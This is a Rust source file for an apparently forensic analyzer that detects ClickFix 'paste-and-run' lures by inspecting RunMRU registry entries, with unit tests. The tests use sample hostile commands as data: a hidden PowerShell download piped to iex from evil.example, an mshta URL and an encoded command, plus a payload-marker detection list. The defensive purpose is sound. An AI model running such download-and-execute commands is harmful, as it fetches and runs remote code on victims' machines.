//! ClickFix / "paste-and-run" (ATT&CK T1204.004): a fake CAPTCHA or error page tells
//! the user to press Win+R and paste a command. Explorer keeps what was typed in the
//! Run dialog under `RunMRU`, so a payload command there is direct evidence of the
//! lure. Red Canary's 2026 report ties six of its top ten threats to this technique.
//!
//! Most Run-dialog entries are harmless (`cmd`, `notepad`, `\\server\share`). An entry
//! is reported only when it launches an interpreter or proxy binary with arguments;
//! a download, encoded payload or URL on top of that makes it High.
#![forbid(unsafe_code)]

use cairn_core::finding::{EntityRegistry, FindingSource, Severity};
use cairn_core::record::{Record, RegValueRecord};
use cairn_core::traits::Analyzer;
use cairn_core::{Finding, Result};

use crate::trust::{has_arguments, invoked_exe, launcher_kind, script_marker_labels};

/// Extra markers seen in paste-and-run payloads beyond the shared script markers.
const PAYLOAD_MARKERS: &[(&str, &str)] = &[
    ("-w h", "hidden window"),
    ("-windowstyle hidden", "hidden window"),
    ("--headless", "headless console"),
    ("| iex", "pipe to iex"),
    ("|iex", "pipe to iex"),
    ("-nop", "-NoProfile"),
    ("/i http", "msiexec from URL"),
];

fn is_run_mru(r: &RegValueRecord) -> bool {
    r.key.to_ascii_lowercase().ends_with(r"\explorer\runmru")
}

/// The launcher this entry starts (any kind in crate::trust::LAUNCHERS), when it is
/// called with arguments.
fn launcher(cmd: &str) -> Option<String> {
    let exe = invoked_exe(cmd)?;
    (launcher_kind(&exe).is_some() && has_arguments(cmd)).then_some(exe)
}

fn payload_markers(cmd: &str) -> Vec<&'static str> {
    let lower = cmd.to_ascii_lowercase();
    let mut out = script_marker_labels(cmd);
    for (needle, label) in PAYLOAD_MARKERS {
        if lower.contains(needle) && !out.contains(label) {
            out.push(label);
        }
    }
    out
}

/// Run-dialog (RunMRU) payload commands.
pub struct ClickFixHeuristic;

impl ClickFixHeuristic {
    /// This analyzer's `name()`, also stamped into `Finding.analyzer`.
    pub const NAME: &'static str = cairn_core::analyzers::CLICKFIX;
}

impl Analyzer for ClickFixHeuristic {
    fn name(&self) -> &str {
        Self::NAME
    }

    fn analyze(&self, records: &[Record], _prior: &[Finding]) -> Result<Vec<Finding>> {
        let mut out = Vec::new();
        for r in records {
            let Record::RegValue(rv) = r else { continue };
            if !is_run_mru(rv) {
                continue;
            }
            let Some(exe) = launcher(&rv.data) else {
                continue;
            };
            let markers = payload_markers(&rv.data);
            let severity = if markers.is_empty() {
                Severity::Medium
            } else {
                Severity::High
            };
            let reason = if markers.is_empty() {
                format!("typed into the Run dialog: {exe} with arguments")
            } else {
                format!(
                    "typed into the Run dialog: {exe} with {}",
                    markers.join(", ")
                )
            };
            let mut f = Finding::new(
                severity,
                format!("「執行」對話框貼上指令：{exe}"),
                FindingSource::Heuristic,
            );
            if let Some(ts) = rv.last_write {
                f.ts = ts;
            }
            f.artifact = "run_mru".into();
            f.mitre = vec!["T1204.004".into()];
            f.details = format!("{}\\{} value {}: {}", rv.hive, rv.key, rv.value, rv.data);
            f.reason = Some(reason);
            f.entity.registry = Some(EntityRegistry {
                hive: rv.hive.clone(),
                key: rv.key.clone(),
                value: rv.value.clone(),
                data: rv.data.clone(),
                last_write: rv.last_write,
            });
            out.push(f);
        }
        Ok(crate::stamped(out, Self::NAME))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn mru(data: &str) -> Record {
        Record::RegValue(RegValueRecord {
            hive: r"HKU\S-1-5-21-1-2-3-1001".into(),
            key: r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU".into(),
            value: "a".into(),
            data: data.into(),
            last_write: None,
        })
    }

    fn run(data: &str) -> Vec<Finding> {
        ClickFixHeuristic.analyze(&[mru(data)], &[]).unwrap()
    }

    #[test]
    fn classic_clickfix_powershell_is_high() {
        let f = run(r#"powershell -w h -c "iwr http://evil.example/a.ps1 | iex""#);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].mitre, vec!["T1204.004"]);
        assert!(f[0].reason.as_deref().unwrap().contains("hidden window"));
    }

    #[test]
    fn mshta_url_is_high() {
        let f = run("mshta https://evil.example/verify.hta");
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn launcher_with_plain_args_is_medium() {
        let f = run(r"cmd /c dir C:\");
        assert_eq!(f[0].severity, Severity::Medium);
    }

    #[test]
    fn bare_tools_and_paths_are_ignored() {
        for d in [
            "cmd",
            "powershell",
            "notepad",
            r"\\fileserver\share",
            "regedit",
            "control",
        ] {
            assert!(run(d).is_empty(), "{d}");
        }
    }

    #[test]
    fn full_path_launcher_is_recognised() {
        let f = run(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBFAFgA");
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn other_registry_values_are_ignored() {
        let rec = Record::RegValue(RegValueRecord {
            hive: "HKCU".into(),
            key: r"Software\Microsoft\Windows\CurrentVersion\Run".into(),
            value: "x".into(),
            data: "powershell -enc AAAA".into(),
            last_write: None,
        });
        assert!(ClickFixHeuristic.analyze(&[rec], &[]).unwrap().is_empty());
    }
}
